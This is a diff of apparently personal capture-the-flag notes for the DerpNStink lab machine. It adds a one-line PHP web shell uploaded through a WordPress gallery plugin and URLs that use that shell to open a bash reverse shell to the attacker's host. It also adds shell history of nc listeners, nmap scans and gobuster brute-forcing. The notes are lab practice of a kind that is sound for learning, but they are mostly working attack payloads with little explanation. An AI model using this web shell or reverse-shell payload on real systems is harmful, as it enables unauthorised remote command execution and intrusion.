@@ -99,11 +99,52 @@ http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php
    41  ftp 192.168.1.231
 
 
-www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -h loaclhost -u root -p
-mysql -h loaclhost -u root -p
-Enter password: mysql
-ERROR 2005 (HY000): Unknown MySQL server host 'loaclhost' (110)
-www-data@DeRPnStiNK:/var/www/html/weblog$ 
+
+<?php system($_GET['cmd']); ?>
+
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php
+
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.162/5555+0>%261'
+
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.phpls
 
 
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?cmd=id
+
+nc -lvnp 5555
+
+danach 
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?cmd=bash+-c+'bash+-i+>%26/dev/tcp/192.168.1.162/5555+0>%261'
+
+
+  ping 8.8.8.8
+    2  ifconfig
+    3  nano shell.php
+    4  nc --lvnp 4444
+    5  nc --lvn 4444
+    6  nc -lvn 4444
+    7  nc -lvn 5555
+    8  ping 192.168.1.231
+    9  nc -lvn 5555 
+   10  nc -lvnp 5555
+   11  nano shell.php
+   12  ifconfig
+   13  ls -l shell.php
+   14  nc -lvn 5555
+   15  nc -lvn 4444
+   16  nc -lvnp 5555 
+   17  nc -lvnp 5555
+   18  sudo nano /etc/hosts
+   19  gobuster dir -u http://derpns.local -w /usr/share/wordlists/dirb/common.txt -x txt,html,php,bak.zip \n
+   20  gobuster dir -u http://derpnstink.local -w /usr/share/wordlists/dirb/common.txt -x txt,html,php,bak.zip \n
+   21  gobuster dir -u http://derpnstink.local/weblog -w /usr/share/wordlists/dirb/common.txt -x txt,html,php,bak.zip \n
+   22  nmap 192.168.1.0/24
+   23  nmap -sCv 192.168.1.231
+   24  nmap -sCV 192.168.1.231
+   25  gobuster dir -u 192.168.1.231 -w /usr/share/wordlists/dirb/common.txt
+   26  gobuster dir -u 192.168.1.231/robot.txt -w /usr/share/wordlists/dirb/common.txt
+   27  gobuster dir -u 192.168.1.231/php/ -w /usr/share/wordlists/dirb/common.txt -x txt,html,php,bak
+   28  gobuster dir -u 192.168.1.231/php/ -w /usr/share/wordlists/dirb/common.txt -x txt,html,php,bak.zip
+   29  gobuster dir -u 192.168.1.231/temporary/ -w /usr/share/wordlists/dirb/common.txt -x txt,html,php,bak.zip
+   30  curl http://192.168.1.231 /#wp-config.php#
 
